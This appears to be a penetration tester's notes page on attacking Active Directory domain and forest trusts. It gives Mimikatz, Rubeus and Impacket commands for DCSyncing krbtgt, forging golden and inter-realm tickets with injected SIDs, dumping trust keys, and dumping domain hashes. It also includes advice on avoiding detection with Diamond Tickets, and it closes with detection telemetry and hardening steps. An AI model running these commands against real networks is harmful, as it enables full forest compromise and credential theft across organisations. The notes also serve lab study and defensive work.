+++
title = 'Domain Trusts'
date = 2026-10-30
type = 'notes'
weight = 70
toc = true
tags = ['active-directory', 'trusts', 'domain-admin']
+++

> A trust establishes **forest** or **intra-forest domain** (parent-child / tree-root) authentication, allowing users to access resources in — or perform administrative tasks in — another domain outside the one where their account resides. A trust creates a link between the authentication systems of two domains and may allow one-way or two-way (bidirectional) communication.

The single most important idea in 2026 is that **the forest, not the domain, is the security boundary** . Within a forest, SID filtering is off by default, which means control of one domain frequently means a path to the entire forest. Cross-forest, the boundary is real but not absolute — a weak `SpoofSIDHistoryBlocked` configuration or the trust key collapses it.

---

## 1. Trust Properties That Decide the Attack

| Property | Meaning | Why it matters |
|---|---|---|
| **Direction** | `Inbound` (the other domain trusts us), `Outbound` (we trust them), `Bidirectional` | You can only authenticate across the trust in the direction that is trusted. An outbound trust lets *your* users access *their* resources; an inbound trust lets *their* users access *yours*. |
| **Transitivity** | Transitive trusts extend to child domains; non-transitive trusts do not | Intra-forest parent-child and tree-root trusts are transitive. External trusts and most forest trusts are non-transitive unless configured otherwise. |
| **SID filtering** | Quarantine (`9`): filters SIDs from the other forest. Disabled for intra-forest trusts by default. | SID-history / ExtraSids abuse works **only** when filtering does not strip the injected SID. Intra-forest: filtering off → ExtraSids works. Cross-forest: filtering on by default → ExtraSids usually blocked, **but** `SpoofSIDHistoryBlocked = False` reopens it. |
| **Selective authentication** | Only explicitly allowed users can authenticate across | If enabled, look for `AllowedToAuthenticate` ACEs / group membership rather than assuming forest-wide access. |

**Enumerate the values:**

```powershell
Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType,TrustAttributes,IsTransitive
Get-ADTrust -Filter * | select Name,Direction,ForestTransitive,SIDFilteringQuarantined,SelectiveAuthentication
nltest /domain_trusts /all_trusts /v
```

- `TrustDirection`: `1` = inbound, `2` = outbound, `3` = bidirectional.
- `TrustAttributes` flags include `WITHIN_FOREST`, `FOREST_TRANSITIVE`, `FILTER_SIDS`, `CROSS_ORGANIZATION`, `SELECTIVE_AUTH`.

> **The 2026 refinement:** “SID filtering is on” is not a boolean. On a cross-forest trust, filtering removes SIDs with a **RID below 1000** — so `Domain Admins` (RID 512) and `Enterprise Admins` (RID 519) are stripped. But the trust can still be abusable if `SpoofSIDHistoryBlocked = False`, because you can inject a **non-builtin** SID (a user, computer, or custom group) that holds indirect full control .

---

## 2. Enumerating Trust Relationships

1. Enumerate trust relationships: `Import-Module activedirectory` → `Get-ADTrust -Filter *`
2. Check existing trusts: `Import-Module .\PowerView.ps1` → `Get-DomainTrust` or `Get-DomainTrustMapping`
3. Check users in the other domain: `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName`
4. `netdom query /domain:inlanefreight.local trust`
5. `netdom query /domain:inlanefreight.local dc`
6. `netdom query /domain:inlanefreight.local workstation`
7. BloodHound: **Map Domain Trusts** pre-built query, or “Shortest Paths to Domain Admins from Owned Principals” across the combined graph .

### Enumerating `SpoofSIDHistory` explicitly

BloodHound models this as a first-class edge, so the check is no longer manual:

- **Edge name:** `SpoofSIDHistory`
- **Condition:** the cross-forest trust from the target domain to the source domain has `SpoofSIDHistoryBlocked = False`
- **Meaning:** the target domain allows principals of the source domain access by **SIDs of the target domain placed in their SID history** .

```cypher
// BloodHound — find SpoofSIDHistory paths from owned principals
MATCH p=(u:User {owned:true})-[r:SpoofSIDHistory*1..]->(g:Group)
RETURN p
```

### New enumeration tooling (2026)

| Tool | What it adds |
|---|---|
| **SharpHound** | Enumerates users, groups, computers, sessions, **domain trusts**, service accounts, and shares via LDAP and RPC  |
| **AyDee** (Rust) | AD recon CLI — LDAP, SMB, WinRM, **BloodHound collection**, Kerberoast, attack-surface triage, domain discovery from target identity/DNS/LDAP  |
| **enumdns** | Resolves DNS hosts directly from a **BloodHound `.zip` or `.json`** — turns graph data into a resolvable host list  |
| **bloodhound-python / bloodhound-ce-python** | Automated collection with auth cascade — the Linux-side collector  |

---

## 3. ExtraSids — Child to Parent (Intra-Forest)

> `sIDHistory` is used in migration scenarios: when a user is migrated to a new domain, the original SID is added to the new account’s `sIDHistory` so it can still access resources in the original domain. An attacker can **inject a privileged SID** into that attribute on an account they control. When logging in, all SIDs associated with the account are added to the token. If a Domain Admin or Enterprise Admin SID is in there, the account can DCSync and forge a Golden Ticket.

### What you need

| Item | Where to get it | Which value to pass |
|---|---|---|
| **Child domain KRBTGT NT hash** | `lsadump::dcsync /user:CHILDDOMAIN\krbtgt` (requires DA in the child) | `/krbtgt:` |
| **Child domain SID** | `Get-DomainSID` | `/sid:` |
| **Forest root Enterprise Admins SID** (`-519`) | `Get-DomainGroup -Domain ROOT.DOMAIN.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | `/sids:` |

> **The most common mistake:** keeping the **child** domain SID for `/sid:` and passing the **forest root** SID to `/sids:`. A child-domain SID in `/sids:` grants nothing in the parent.

### Forge the ticket

```cmd
:: Mimikatz
kerberos::golden /user:fakeuser /domain:CHILD.DOMAIN.LOCAL /sid:<child-sid> ^
  /krbtgt:<krbtgt-nt-hash> /sids:<enterprise-admins-sid> /ptt

:: Rubeus
.\Rubeus.exe golden /rc4:<krbtgt-nt-hash> /domain:CHILD.DOMAIN.LOCAL ^
  /sid:<child-sid> /sids:<enterprise-admins-sid> /user:fakeuser /ptt
```

```bash
# Linux — Impacket ticketer.py
ticketer.py -nthash <krbtgt-nt-hash> -domain-sid <child-sid> ^
  -domain CHILD.DOMAIN.LOCAL -extra-sid <enterprise-admins-sid> fakeuser
export KRB5CCNAME=fakeuser.ccache
impacket-secretsdump -k -no-pass -just-dc ROOT.DOMAIN.LOCAL/Administrator@dc.root.domain.local
```

Check with `klist`; the ticket is in memory for a user that does not need to exist. You can now list the DC’s `C$`, DCSync, and so on.

> **Diamond Ticket as the OPSEC alternative.** A Diamond Ticket is created from a **legitimate TGT** rather than fabricated from scratch, so it inherits a real issuance time and avoids the “never logged in” anomaly that some detections key on . Use it when you already have a valid TGT for the account.

---

## 4. Cross-Forest SID History — The `SpoofSIDHistory` Nuance

This is the part most write-ups get wrong. A cross-forest trust with SID filtering **does** strip built-in RIDs (below 1000), so the classic `Enterprise Admins` ExtraSids trick **does not work** against a properly configured cross-forest trust. What does work is a **non-builtin** target SID .

### What SID filtering removes

- SIDs with **RID < 1000** — `Domain Admins` (512), `Enterprise Admins` (519), `Schema Admins` (518), and all built-in groups.
- **Group membership is not applied from SID history for global and universal groups** — so even a non-builtin global group in SID history is ineffective.

### What remains viable

The target must be a **user, computer, or non-builtin group** that holds permissions **directly** or through **built-in / domain-local** groups — **not** through membership of a global or universal group. Common viable targets with indirect full control :

- **Exchange Windows Permissions** — often holds `WriteDacl` on the domain object.
- **Entra ID sync (`MSOL_`) accounts** — frequently over-privileged.
- **Custom groups** with administrative control over Tier-0 assets.

### The attack

1. Confirm `SpoofSIDHistoryBlocked = False` (BloodHound `SpoofSIDHistory` edge, or query the TDO’s `trustAttributes`).
2. Obtain the **source domain’s krbtgt** credentials (you have DA there).
3. Forge a Golden Ticket **in the trusted domain** with the **target domain’s viable SID** in SID history :

```cmd
Rubeus.exe golden /aes256:<krbtgt-AES256> /user:<user> /id:<RID> ^
  /domain:<trusted-domain> /sid:<trusted-domain-SID> /sids:<target-SID> ^
  /dc:<trusted-dc> /nowrap /ptt
```

```bash
ticketer.py -nthash <krbtgt-NT> -aesKey <krbtgt-AES256> -domain-sid <trusted-SID> ^
  -domain <trusted-domain> -extra-sid <target-SID> <user>
```

> **Direct LDAP editing of `sIDHistory` is not the path.** `Mimikatz sid::patch` does **not** work on Windows Server 2016 and later; `DSInternals Add-ADDBSidHistory` requires stopping and restarting the NTDS service, which is not acceptable in production. Forging the ticket is the safer route .

---

## 5. Cross-Forest Trust Key — Inter-Realm TGT Forgery

When SID filtering is genuinely enforced and no `SpoofSIDHistory` target exists, the remaining cross-forest primitive is the **trust key**: the `TRUST_NAME$` machine account hash that **both forest KDCs use to sign inter-realm ticket-granting tickets** .

### Requirements

- **Domain Admin in one of the two domains** (to extract the trust key).
- Network reachability to the target forest’s KDC.

### Extract the trust key

```cmd
:: Mimikatz — dump the trust key from the current DC
lsadump::trust /patch

:: or pull it via DCSync against the trusted domain's trust account
lsadump::dcsync /domain:<trusted-domain> /user:<trusted-domain>$
```

### Forge the inter-realm TGT

```cmd
:: Mimikatz — forge an inter-realm TGT with the target forest's Enterprise Admins SID
kerberos::golden /domain:<trusted-domain> /sid:<trusted-SID> /rc4:<trust-key> ^
  /user:Administrator /target:<target-domain> /sids:<target-Enterprise-Admins-SID> /ptt
```

```bash
# Impacket — ticketer with /extra-sid, then use the cross-realm ticket
ticketer.py -nthash <trust-key> -domain-sid <trusted-SID> -domain <trusted-domain> ^
  -extra-sid <target-EA-SID> Administrator
```

The target KDC accepts the inter-realm TGT **when SID filtering is disabled** or when the injected SID is one filtering does not strip. If SID filtering is enforced and the SID is built-in, this path is closed — which is why the `SpoofSIDHistory` check in Section 4 comes first.

> **Reference scenario — HTB DarkZero (2026):** a bidirectional cross-forest trust where the escalation path was **cross-forest TGT delegation**, not SID history. As SYSTEM on DC02, the attacker abused delegated TGT capture to obtain **DC01’s machine account TGT** and used it to dump all domain hashes from DC01. This is the “capture the real DC$ TGT” route that bypasses SID filtering entirely .

---

## 6. Cross-Forest — Practical Quick Checks

```bash
# Kerberoast across the trust
impacket-GetUserSPNs <other-domain>/<user>:<pass> -dc-ip <other-dc> -request -outputfile tgs.txt

# Password reuse check against the other domain
nxc smb <other-dc> -d <other-domain> -u <user> -p <pass>

# Cross-forest Kerberos service ticket — note the OTHER domain's SPNs
impacket-getST -spn <service>/<host>.<other-domain> -dc-ip <other-dc> ^
  -k -no-pass <other-domain>/<user>

# Enumerate foreign security principals and SID history on cross-forest accounts
# (Impacket / LDAP — see the forest-trust audit skill for the full workflow)
```

- **Look for admin password reuse and cross-trust group memberships.** A Domain Admin in the child is often a local admin in the parent (and vice versa).
- **Cross-forest tickets use the other domain’s SPNs** — request with `impacket-getST` against the other DC.
- **Cross-forest Kerberoasting** works by specifying the target domain in `GetUserSPNs`.

---

## 7. Adjacent: FreeIPA — AD Trust Ticket Impersonation (CVE-2026-11861)

If the environment is **not pure Windows** and a **FreeIPA deployment trusts Active Directory**, this is a 2026 addition worth checking.

| Property | Detail |
|---|---|
| **CVE** | CVE-2026-11861 |
| **Cause** | FreeIPA services fail to verify **Privilege Attribute Certificate (PAC) certificates** |
| **Primitive** | An authenticated AD user obtains a **TGS with an impersonated client name (cname)** — bypassing authentication to FreeIPA services |
| **Affected services** | FreeIPA web portal, SMB server, LDAP directory |
| **Impact** | Potential privilege escalation within the FreeIPA domain |
| **Fixed** | FreeIPA 4.13.3-1.1.fc43 / 4.13.3-1.fc44; RHEL 9 via RHSA-2026:70564; RHEL 10 via RHSA-2026:72279 |

**Checks:**

```bash
# Is a FreeIPA–AD trust configured?
ipa trust-find 2>/dev/null
# Duplicate SPNs — the precondition for the duplicate-SPN path
ldapsearch -x -H ldap://<ipa-server> -b "cn=accounts,dc=..." "(servicePrincipalName=*)" servicePrincipalName
```

**Mitigation (per the advisory):** patch AD DCs and FreeIPA, enforce **SPN and UPN uniqueness**, audit the trust for **unexpected or duplicate SPNs**, and monitor **unusual Kerberos TGS requests for FreeIPA services** and **unexpected FreeIPA authentication by AD accounts** .

---

## 8. Detection — What Each Trust Attack Exposes

| Attack | Primary telemetry |
|---|---|
| **ExtraSids / forged Golden Ticket** | DC **4768/4769** with a PAC that asserts a group the account is not a member of; Defender for Identity “Kerberos forged PAC” looks for **privilege assertion mismatches**  |
| **Diamond Ticket** | A legitimately issued TGT whose PAC is modified — harder to spot; baseline normal TGT issuance times per account |
| **Inter-realm TGT forgery** | **4768** with `PreAuthType` inconsistencies; inter-realm TGTs from unexpected source domains; trust-key usage outside normal replication windows |
| **`SpoofSIDHistory`** | A TGT whose SID history contains a **target-domain SID** — the source-domain account should never legitimately carry it |
| **DCSync after trust abuse** | **4662** with `DS-Replication-Get-Changes` / `-All`, and abnormal **DRSUAPI** replication activity  |
| **Cross-forest machine TGT capture** | A machine account TGT used from a host that is not that machine |

**Key detection gap:** many environments have **no PAC validation** beyond the KDC, and **CA/trust auditing is off by default**. A forged ticket with a plausible PAC may never generate an alert unless you are baselining **group membership assertion mismatches** rather than looking for known-bad tool names.

### Hardening (from the 2026 trust-abuse guidance)

- **Treat the forest, not the domain, as the security boundary**; design tiering accordingly .
- **Enforce SID filtering (quarantine)** on external and, where feasible, **intra-forest** trusts, so injected SIDs are dropped .
- **Rotate trust keys**, and **reset `krbtgt` twice** on a regular schedule across the forest — a forged TGT is valid until the krbtgt password is rotated twice .
- **Disable unconstrained delegation** and **turn off the Print Spooler** on domain controllers (coercion surface) .
- Use the **Protected Users** group for Kerberos protection; **minimise and audit** the trusts you actually need .
- For cross-forest, audit **`SpoofSIDHistoryBlocked`** on every trust and monitor for SID-history TGTs that carry target-domain SIDs.

---

## 9. Field Notes

- **Check `SpoofSIDHistoryBlocked` before assuming a cross-forest trust is safe.** SID filtering being “on” is not enough — the question is whether a **non-builtin, domain-local** SID gives indirect control.
- **For intra-forest, `/sid:` is the child, `/sids:` is the forest root EA SID.** Swapping them is the most common ExtraSids failure.
- **For cross-forest, `Enterprise Admins` (RID 519) will be stripped.** Target Exchange Windows Permissions, `MSOL_` sync accounts, or custom Tier-0 groups instead.
- **`sIDHistory` cannot be edited directly on Server 2016+.** Use a forged ticket, not `sid::patch`; `Add-ADDBSidHistory` needs an NTDS restart.
- **The trust key is the fallback when SID filtering is enforced.** It requires DA in one domain and produces an inter-realm TGT — but it is closed if the injected SID is built-in and filtering is on.
- **HTB DarkZero shows the non-SID-history path:** cross-forest TGT delegation to capture a real DC$ TGT, then DCSync — no SID injection at all .
- **FreeIPA is a separate 2026 surface.** If the environment includes an AD-trusted FreeIPA, CVE-2026-11861 is a PAC-verification bypass worth checking before assuming the trust is only a Windows problem.

Full machine-by-machine context: [HTB Windows machines](/notes/oscp-labs/windows/).
